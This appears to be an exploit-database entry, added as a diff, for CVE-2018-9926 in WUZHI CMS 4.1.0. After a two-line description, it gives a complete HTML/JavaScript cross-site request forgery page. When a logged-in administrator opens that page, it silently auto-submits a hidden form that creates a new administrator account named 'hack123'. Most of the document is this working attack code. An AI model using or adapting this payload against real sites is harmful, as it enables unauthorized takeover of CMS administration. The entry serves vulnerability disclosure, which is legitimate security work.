@@ -1,0 +1,42 @@
+# Exploit Title: WUZHI CMS 4.1.0 CSRF vulnerability add admin account
+# Date: 2018-04-10
+# Exploit Author: taoge
+# Vendor Homepage: https://github.com/wuzhicms/wuzhicms
+# Software Link: https://github.com/wuzhicms/wuzhicms
+# Version: 4.1.0 
+# CVE : CVE-2018-9926
+ 
+An issue was discovered in WUZHI CMS 4.1.0.（https://github.com/wuzhicms/wuzhicms/issues/128）
+There is a CSRF vulnerability that can add an admin account via index.php?m=core&f=power&v=add.
+After the administrator logged in, open the csrf exp page.
+ 
+ 
+<html><body>
+<script type="text/javascript">
+function post(url,fields)
+{
+var p = document.createElement("form");
+p.action = url;
+p.innerHTML = fields;
+p.target = "_self";
+p.method = "post";
+document.body.appendChild(p);
+p.submit();
+}
+function csrf_hack()
+{
+var fields;
+
+
+fields += "<input type='hidden' name='form[role][]' value='1' />";
+fields += "<input type='hidden' name='form[username]' value='hack123' />";  
+fields += "<input type='hidden' name='form[password]' value='' />";  
+fields += "<input type='hidden' name='form[truename]' value='taoge@5ecurity' />";  
+
+
+var url = "http://127.0.0.1/www/index.php?m=core&f=power&v=add&&_su=wuzhicms&_menuid=61&_submenuid=62&submit=taoge";
+post(url,fields);
+}
+window.onload = function() { csrf_hack();}
+</script>
+</body></html>
